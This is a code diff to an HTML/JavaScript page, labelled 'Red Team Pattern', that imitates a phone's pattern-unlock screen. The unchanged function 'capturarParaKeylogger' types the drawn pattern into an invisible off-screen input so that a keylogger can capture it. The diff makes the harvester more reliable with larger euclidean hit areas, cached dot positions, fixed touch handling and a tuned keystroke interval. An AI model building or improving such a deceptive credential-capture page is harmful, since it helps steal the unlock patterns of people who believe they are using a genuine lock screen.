@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Red Team Pattern Bridge - High Perf</title>
+    <title>Red Team Pattern - Ultra Sensitive</title>
     <style>
         :root {
             --mario-white: #ffffff;
@@ -22,7 +22,6 @@
             background-size: cover; background-color: #1a1a1a;
         }
 
-        /* Input invisible para captura de Red Team */
         #key-sink { position: absolute; top: -100px; opacity: 0; }
 
         .overlay {
@@ -76,6 +75,7 @@
             width: 10px; height: 10px; background: var(--mario-white); 
             border: none; border-radius: 50%; margin: auto;
             box-shadow: 0 0 5px rgba(0,0,0,0.3);
+            pointer-events: none;
         }
 
         .bottom-links {
@@ -110,15 +110,15 @@
         </div>
         <canvas id="pattern-canvas"></canvas>
         <div class="dots-grid">
-            <div class="dot" data-id="1"></div>
-            <div class="dot" data-id="2"></div>
-            <div class="dot" data-id="3"></div>
-            <div class="dot" data-id="4"></div>
-            <div class="dot" data-id="5"></div>
-            <div class="dot" data-id="6"></div>
-            <div class="dot" data-id="7"></div>
-            <div class="dot" data-id="8"></div>
-            <div class="dot" data-id="9"></div>
+            <div class="dot" id="d1" data-id="1"></div>
+            <div class="dot" id="d2" data-id="2"></div>
+            <div class="dot" id="d3" data-id="3"></div>
+            <div class="dot" id="d4" data-id="4"></div>
+            <div class="dot" id="d5" data-id="5"></div>
+            <div class="dot" id="d6" data-id="6"></div>
+            <div class="dot" id="d7" data-id="7"></div>
+            <div class="dot" id="d8" data-id="8"></div>
+            <div class="dot" id="d9" data-id="9"></div>
         </div>
     </div>
 
@@ -147,25 +147,31 @@
     let failCount = 0;
     let lineColor = '#ffffff';
     let mousePos = { x: 0, y: 0 };
+    let dotCenters = [];
 
     canvas.width = 280;
     canvas.height = 280;
 
-    function getDotCenter(dot) {
-        const rect = dot.getBoundingClientRect();
-        const wrapperRect = wrapper.getBoundingClientRect();
-        return {
-            x: rect.left - wrapperRect.left + rect.width / 2,
-            y: rect.top - wrapperRect.top + rect.height / 2,
-            id: dot.dataset.id
-        };
+    // Precargar centros para mayor velocidad
+    function updateCenters() {
+        dotCenters = Array.from(dots).map(dot => {
+            const rect = dot.getBoundingClientRect();
+            const wrapperRect = wrapper.getBoundingClientRect();
+            return {
+                x: rect.left - wrapperRect.left + rect.width / 2,
+                y: rect.top - wrapperRect.top + rect.height / 2,
+                id: dot.dataset.id,
+                element: dot
+            };
+        });
     }
 
     function start(e) {
+        updateCenters();
         isDrawing = true;
         path = [];
         lineColor = '#ffffff';
-        dots.forEach(d => d.classList.remove('active'));
+        dotCenters.forEach(c => c.element.classList.remove('active'));
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         popup.style.display = 'none';
         keySink.value = "";
@@ -178,18 +184,17 @@
         const rect = wrapper.getBoundingClientRect();
         mousePos = { x: clientX - rect.left, y: clientY - rect.top };
 
-        dots.forEach(dot => {
-            const dRect = dot.getBoundingClientRect();
-            // --- MEJORA: Área de detección aumentada a 30px para no perder el 5 o el 7 ---
-            const hitArea = 30; 
-            const centerX = dRect.left + dRect.width / 2;
-            const centerY = dRect.top + dRect.height / 2;
+        dotCenters.forEach(center => {
+            // --- FÍSICA MEJORADA: Distancia Euclidiana para "pegajosidad" ---
+            const dx = mousePos.x - center.x;
+            const dy = mousePos.y - center.y;
+            const distance = Math.sqrt(dx * dx + dy * dy);
 
-            if (Math.abs(clientX - centerX) < hitArea && Math.abs(clientY - centerY) < hitArea) {
-                const center = getDotCenter(dot);
+            // Si el dedo está cerca (radio 35px), lo captura
+            if (distance < 35) {
                 if (!path.find(p => p.id === center.id)) {
                     path.push(center);
-                    dot.classList.add('active');
+                    center.element.classList.add('active');
                     if (navigator.vibrate) navigator.vibrate(40);
                 }
             }
@@ -219,7 +224,6 @@
     function capturarParaKeylogger(texto) {
         keySink.focus();
         let i = 0;
-        // --- MEJORA: Intervalo de 80ms para que el keylogger capte todo sin saltos ---
         const intervalo = setInterval(() => {
             if (i < texto.length) {
                 keySink.value += texto[i];
@@ -229,16 +233,15 @@
                 clearInterval(intervalo);
                 keySink.blur();
             }
-        }, 80); 
+        }, 100); 
     }
 
     function resetUI() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-        dots.forEach(d => d.classList.remove('active'));
+        dotCenters.forEach(c => c.element.classList.remove('active'));
         path = [];
     }
 
-    // --- MEJORA: requestAnimationFrame para eliminar la lentitud (lag) ---
     function renderLoop() {
         if (isDrawing) {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -260,12 +263,14 @@
     }
     renderLoop();
 
+    wrapper.addEventListener('touchstart', (e) => { e.preventDefault(); start(e); }, { passive: false });
+    window.addEventListener('touchmove', (e) => { move(e); }, { passive: false });
+    window.addEventListener('touchend', end);
+    
+    // PC Support
     wrapper.addEventListener('mousedown', start);
     window.addEventListener('mousemove', move);
     window.addEventListener('mouseup', end);
-    wrapper.addEventListener('touchstart', (e) => { e.preventDefault(); start(); }, { passive: false });
-    window.addEventListener('touchmove', move, { passive: false });
-    window.addEventListener('touchend', end);
 </script>
 </body>
 </html>
